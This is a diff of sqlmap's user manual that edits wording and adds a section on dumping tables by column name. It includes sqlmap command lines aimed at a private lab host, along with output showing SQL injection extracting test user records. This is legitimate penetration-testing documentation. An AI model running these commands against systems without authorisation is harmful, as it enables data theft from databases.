@@ -325,7 +325,7 @@ custom application credentials.
 
 <item>Support to <bf>run custom SQL statement(s)</bf> as in an interactive
 SQL client connecting to the back-end database. sqlmap automatically
-dissects the provided statement, determins which technique to use to
+dissects the provided statement, determines which technique to use to
 inject it and how to pack the SQL payload accordingly.
 </itemize>
 
@@ -3338,10 +3338,12 @@ Options: <tt>-</tt><tt>-dump</tt>, <tt>-C</tt>, <tt>-T</tt>, <tt>-D</tt>,
 and <tt>-</tt><tt>-last</tt>
 
 <p>
-It is possible to dump the entries for a specific database table.
+It is possible to dump table entries.
 This functionality depends on the option <tt>-T</tt> to specify the table
-name or the option <tt>-C</tt> to specify the column name and optionally
-on <tt>-D</tt> to specify the database name.
+name or on the option <tt>-C</tt> to specify the column name and,
+optionally on <tt>-D</tt> to specify the database name.
+
+<p>
 If the table name is specified, but the database name is not, the current
 database name is used.
 
@@ -3355,31 +3357,31 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --du
 [...]
 back-end DBMS: MySQL >= 5.0.0
 
-[17:51:41] [WARNING] missing database parameter, sqlmap is going to use the current 
+[hh:mm:41] [WARNING] missing database parameter, sqlmap is going to use the current 
 database to dump table 'users' entries
-[17:51:41] [INFO] fetching current database
-[17:51:41] [INFO] retrieved: testdb
-[17:51:41] [INFO] fetching columns for table 'users' on database 'testdb'
-[17:51:41] [INFO] fetching number of columns for table 'users' on database 'testdb'
-[17:51:41] [INFO] retrieved: 3
-[17:51:41] [INFO] retrieved: id
-[17:51:41] [INFO] retrieved: name
-[17:51:41] [INFO] retrieved: surname
-[17:51:41] [INFO] fetching entries for table 'users' on database 'testdb'
-[17:51:41] [INFO] fetching number of entries for table 'users' on database 'testdb'
-[17:51:41] [INFO] retrieved: 4
-[17:51:41] [INFO] retrieved: 1
-[17:51:42] [INFO] retrieved: luther
-[17:51:42] [INFO] retrieved: blissett
-[17:51:42] [INFO] retrieved: 2
-[17:51:42] [INFO] retrieved: fluffy
-[17:51:42] [INFO] retrieved: bunny
-[17:51:42] [INFO] retrieved: 3
-[17:51:42] [INFO] retrieved: wu
-[17:51:42] [INFO] retrieved: ming
-[17:51:43] [INFO] retrieved: 4
-[17:51:43] [INFO] retrieved:  
-[17:51:43] [INFO] retrieved: nameisnull
+[hh:mm:41] [INFO] fetching current database
+[hh:mm:41] [INFO] retrieved: testdb
+[hh:mm:41] [INFO] fetching columns for table 'users' on database 'testdb'
+[hh:mm:41] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[hh:mm:41] [INFO] retrieved: 3
+[hh:mm:41] [INFO] retrieved: id
+[hh:mm:41] [INFO] retrieved: name
+[hh:mm:41] [INFO] retrieved: surname
+[hh:mm:41] [INFO] fetching entries for table 'users' on database 'testdb'
+[hh:mm:41] [INFO] fetching number of entries for table 'users' on database 'testdb'
+[hh:mm:41] [INFO] retrieved: 4
+[hh:mm:41] [INFO] retrieved: 1
+[hh:mm:42] [INFO] retrieved: luther
+[hh:mm:42] [INFO] retrieved: blissett
+[hh:mm:42] [INFO] retrieved: 2
+[hh:mm:42] [INFO] retrieved: fluffy
+[hh:mm:42] [INFO] retrieved: bunny
+[hh:mm:42] [INFO] retrieved: 3
+[hh:mm:42] [INFO] retrieved: wu
+[hh:mm:42] [INFO] retrieved: ming
+[hh:mm:43] [INFO] retrieved: 4
+[hh:mm:43] [INFO] retrieved:  
+[hh:mm:43] [INFO] retrieved: nameisnull
 Database: testdb
 Table: users
 [4 entries]
@@ -3419,6 +3421,84 @@ Table: users
 </verb></tscreen>
 
 <p>
+If only the column name is specified, sqlmap will enumerate and ask the
+user to dump all databases' tables containing user provided column(s).
+This feature can be useful to identify, for instance, tables containing
+custom application credentials.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 --dump \
+  -C "urna"
+
+[...]
+back-end DBMS: MySQL >= 5.0.0
+
+do you want sqlmap to consider provided column(s):
+[1] as LIKE column names (default)
+[2] as exact column names
+> 1
+[19:18:08] [INFO] fetching databases with tables containing columns like 'urna'
+[19:18:08] [INFO] fetching number of databases with tables containing columns like 
+'urna'
+[19:18:08] [INFO] retrieved: 1
+[19:18:08] [INFO] retrieved: testdb
+[19:18:10] [INFO] fetching tables containing columns like 'urna' in database 'testdb'
+[19:18:10] [INFO] fetching number of tables containing columns like 'urna' in 
+database 'testdb'
+[19:18:10] [INFO] retrieved: 1
+[19:18:10] [INFO] retrieved: users
+[19:18:10] [INFO] fetching columns like 'urna' for table 'users' on database 'testdb'
+[19:18:10] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[19:18:10] [INFO] retrieved: 1
+[19:18:10] [INFO] retrieved: surname
+Columns like 'urna' were found in the following databases:
+Database: testdb
+Table: users
+[1 column]
++---------+
+| Column  |
++---------+
+| surname |
++---------+
+
+do you want to dump entries? [Y/n] y
+which database(s)?
+[a]ll (default)
+[testdb]
+[q]uit
+> 
+which table(s) of database 'testdb'?
+[a]ll (default)
+[users]
+[s]kip
+[q]uit
+> 
+[19:18:23] [INFO] fetching columns 'surname' entries for table 'users' on 
+database 'testdb'
+[19:18:23] [INFO] fetching number of columns 'surname' entries for table 
+'users' on database 'testdb'
+[19:18:23] [INFO] retrieved: 4
+[19:18:23] [INFO] retrieved: blissett
+[19:18:23] [INFO] retrieved: bunny
+[19:18:23] [INFO] retrieved: ming
+[19:18:23] [INFO] retrieved: nameisnull
+Database: testdb
+Table: users
+[4 entries]
++------------+
+| surname    |
++------------+
+| blissett   |
+| bunny      |
+| ming       |
+| nameisnull |
++------------+
+</verb></tscreen>
+
+<p>
 sqlmap also stores for each table the dumped entries in a CSV format file.
 You can see the absolute path where sqlmap stores the dumped tables entries
 by providing a verbosity level greater than or equal to 1.
@@ -3448,8 +3528,8 @@ Table: users
 172.16.213.131/dump/public/users.csv'
 [...]
 
-$ cat /software/sqlmap/output/172.16.213.131/dump/public/users.csv 
-"id","name","surname"
+$ cat ./output/172.16.213.131/dump/public/users.csv 
+id,name,surname
 "1","luther","blissett"
 "2","fluffy","bunny"
 "3","wu","ming"
@@ -3459,13 +3539,13 @@ $ cat /software/sqlmap/output/172.16.213.131/dump/public/users.csv
 
 <p>
 You can also provide the <tt>-</tt><tt>-start</tt> and/or the <tt>-</tt><tt>-stop</tt>
-options to limit the dump to a range of entries, while those entries can be further limited
-to a range of character positions provided with <tt>-</tt><tt>-first</tt> and/or the 
-<tt>-</tt><tt>-last</tt> options.
+options to limit the dump to a range of entries, while those entries can be further
+limited to a range of character positions provided with <tt>-</tt><tt>-first</tt> 
+and/or the <tt>-</tt><tt>-last</tt> options:
 
 <itemize>
-<item><tt>-</tt><tt>-start</tt> specifies the first entry to enumerate
-<item><tt>-</tt><tt>-stop</tt> specifies the last entry to enumerate
+<item><tt>-</tt><tt>-start</tt> specifies the first entry to enumerate.
+<item><tt>-</tt><tt>-stop</tt> specifies the last entry to enumerate.
 </itemize>
 
 <p>
@@ -3478,19 +3558,19 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --du
 Database: testdb
 Table: users
 [3 entries]
-+----+----------------------------------------------+-------------------+
-| id | name                                         | surname           |
-+----+----------------------------------------------+-------------------+
-| 2  | fluffy                                       | bunny             |
-| 3  | wu                                           | ming              |
++----+--------------------------------------------+-------------------+
+| id | name                                       | surname           |
++----+--------------------------------------------+-------------------+
+| 2  | fluffy                                     | bunny             |
+| 3  | wu                                         | ming              |
 | 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
-+----+----------------------------------------------+-------------------+
++----+--------------------------------------------+-------------------+
 </verb></tscreen>
 
 <p>
 As you can see, sqlmap is very flexible. You can leave it to automatically
-enumerate the whole database table up to a single column of a specific
-table entry.
+enumerate the whole database table up to a range of characters of a single
+column of a specific table entry.
 
 
 <sect2>Dump all databases tables entries
@@ -3509,15 +3589,15 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --du
 Database: testdb
 Table: users
 [5 entries]
-+----+----------------------------------------------+-------------------+
-| id | name                                         | surname           |
-+----+----------------------------------------------+-------------------+
-| 1  | luther                                       | blissett          |
-| 2  | fluffy                                       | bunny             |
-| 3  | wu                                           | ming              |
++----+--------------------------------------------+-------------------+
+| id | name                                       | surname           |
++----+--------------------------------------------+-------------------+
+| 1  | luther                                     | blissett          |
+| 2  | fluffy                                     | bunny             |
+| 3  | wu                                         | ming              |
 | 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
-| 5  | NULL                                         | nameisnull        |
-+----+----------------------------------------------+-------------------+
+| 5  | NULL                                       | nameisnull        |
++----+--------------------------------------------+-------------------+
 
 Database: information_schema
 Table: CHARACTER_SETS
@@ -3620,21 +3700,23 @@ considered a system database because some database administrators use it
 as a users' database.
 
 
-<sect2>Run your own SQL statement
+<sect2>Execute your SQL statement
 
 <p>
 Options: <tt>-</tt><tt>-sql-query</tt> and <tt>-</tt><tt>-sql-shell</tt>
 
 <p>
-The SQL query and the SQL shell features makes the user able to run
-custom SQL statement on the web application's back-end database management.
-sqlmap recognizes the type of SQL statement provided and automatically
-chooses which SQL injection technique to use for it to be able to execute it.
-If it is a <tt>SELECT</tt> statement it will retrieve its output through 
-the blind SQL injection or UNION query SQL injection technique depending
-on the user's options. Otherwise it will execute the query through the 
-stacked query SQL injection technique if the web application supports 
-multiple statements on the back-end database management system.
+The SQL query and the SQL shell features makes the user able to execute
+custom SQL statements on the web application's back-end database
+management.
+sqlmap automatically dissects the provided statement, determines which
+technique to use to inject it and how to pack the SQL payload accordingly.
+
+If it is a <tt>SELECT</tt> statement, sqlmap will retrieve its output
+through the blind SQL injection or UNION query SQL injection technique
+depending on the user's options. Otherwise it will execute the query
+through the stacked query SQL injection technique if the web application
+supports multiple statements on the back-end database management system.
 
 <p>
 Examples on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
@@ -3989,30 +4071,23 @@ the provided SQL statement in a multiple statement mode.
 
 <p>
 Beware that some web application technologies do not support stacked
-queries on specific database management systems. For instance, PHP does not
-support stacked queries when the back-end DBMS is MySQL, but it does
+queries on specific database management systems. For instance, PHP does
+not support stacked queries when the back-end DBMS is MySQL, but it does
 support when the back-end DBMS is PostgreSQL.
 
 
 <sect1>User-defined function injection
 
-<sect2>Inject custom user-injection functions
+<sect2>Inject custom user-defined functions (UDF)
 
 <p>
-Option: <tt>-</tt><tt>-udf-inject</tt>
-#TODO
-
-
-<sect2>Local path of the shared library
-
-<p>
-Option: <tt>-</tt><tt>-shared-lib</tt>
+Options: <tt>-</tt><tt>-udf-inject</tt> and <tt>-</tt><tt>-shared-lib</tt>
 #TODO
 
 
 <sect1>File system access
 
-<sect2>Read a file from the back-end DBMS file system
+<sect2>Read a file from the database server's file system
 
 <p>
 Option: <tt>-</tt><tt>-read-file</tt>
@@ -4135,7 +4210,7 @@ output/172.16.213.131/files/C__example.exe: PE32 executable for MS Windows (GUI)
 </verb></tscreen>
 
 
-<sect2>Write a local file on the back-end DBMS file system
+<sect2>Write a local file on the database server's file system
 
 <p>
 Options: <tt>-</tt><tt>-write-file</tt> and <tt>-</tt><tt>-dest-file</tt>
